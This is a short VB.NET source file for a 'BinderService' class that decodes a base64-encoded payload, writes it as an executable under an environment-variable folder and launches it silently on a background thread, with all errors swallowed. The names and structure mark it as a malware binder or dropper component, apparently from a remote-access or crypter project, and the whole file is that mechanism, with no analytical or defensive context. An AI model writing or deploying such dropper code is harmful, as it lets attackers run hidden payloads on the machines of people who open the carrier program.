Imports System.Diagnostics
Imports System.IO
Namespace Other
    Public Class BinderService
        Public BinderBytes As String = ""
        Public DropperPath As String = ""
        Public DropperName As String = ""
        Public Function StartBinder()
            Dim BinderThread As New Threading.Thread(AddressOf NewBinder)
            BinderThread.IsBackground = True
            BinderThread.Start()
            Return True
        End Function
        Public Function NewBinder()
            Try
                IO.File.WriteAllBytes(Path.Combine(Environ(DropperPath), DropperName), Convert.FromBase64String(BinderBytes))
                Process.Start(Path.Combine(Environ(DropperPath), DropperName))
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function
    End Class
End Namespace